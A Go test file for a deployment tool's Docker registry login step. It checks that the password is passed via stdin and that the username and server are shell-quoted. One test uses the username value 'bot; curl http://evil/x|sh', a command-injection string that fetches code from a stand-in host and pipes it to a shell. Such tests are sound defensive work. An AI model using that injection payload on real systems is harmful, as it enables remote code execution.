package engine

import (
	"bytes"
	"context"
	"strings"
	"testing"

	"github.com/goodsmileduck/dockrail/config"
	"github.com/goodsmileduck/dockrail/connection"
)

func TestRegistryLoginRunsWithCreds(t *testing.T) {
	t.Setenv("DOCKRAIL_REGISTRY_USER", "u")
	t.Setenv("DOCKRAIL_REGISTRY_PASSWORD", "p")
	f := connection.NewFake()
	var log bytes.Buffer
	if err := registryLogin(context.Background(), f, config.Registry{Server: "registry.gitlab.com"}, &log); err != nil {
		t.Fatal(err)
	}
	all := strings.Join(f.Commands, "\n")
	if !strings.Contains(all, "docker login 'registry.gitlab.com'") || !strings.Contains(all, "--password-stdin") {
		t.Fatalf("expected password-stdin login, got:\n%s", all)
	}
	// password must not appear as an argument
	if strings.Contains(all, "-p p") || strings.Contains(all, "--password p") {
		t.Fatalf("password leaked into argv:\n%s", all)
	}
}

func TestRegistryLoginQuotesUserAndServer(t *testing.T) {
	t.Setenv("DOCKRAIL_REGISTRY_USER", "bot; curl http://evil/x|sh")
	t.Setenv("DOCKRAIL_REGISTRY_PASSWORD", "p")
	f := connection.NewFake()
	var log bytes.Buffer
	if err := registryLogin(context.Background(), f, config.Registry{Server: "reg host"}, &log); err != nil {
		t.Fatal(err)
	}
	all := strings.Join(f.Commands, "\n")
	// The metacharacters must be neutralized inside single quotes, not live.
	if !strings.Contains(all, "--username 'bot; curl http://evil/x|sh'") {
		t.Fatalf("username not safely quoted:\n%s", all)
	}
	if !strings.Contains(all, "docker login 'reg host'") {
		t.Fatalf("server not safely quoted:\n%s", all)
	}
}

func TestRegistryLoginSkipsWithoutCreds(t *testing.T) {
	f := connection.NewFake()
	var log bytes.Buffer
	if err := registryLogin(context.Background(), f, config.Registry{Server: "registry.gitlab.com"}, &log); err != nil {
		t.Fatal(err)
	}
	if len(f.Commands) != 0 {
		t.Fatalf("login must be skipped without creds, got %v", f.Commands)
	}
	if !strings.Contains(log.String(), "skip") {
		t.Fatalf("skip must be logged, got %q", log.String())
	}
}
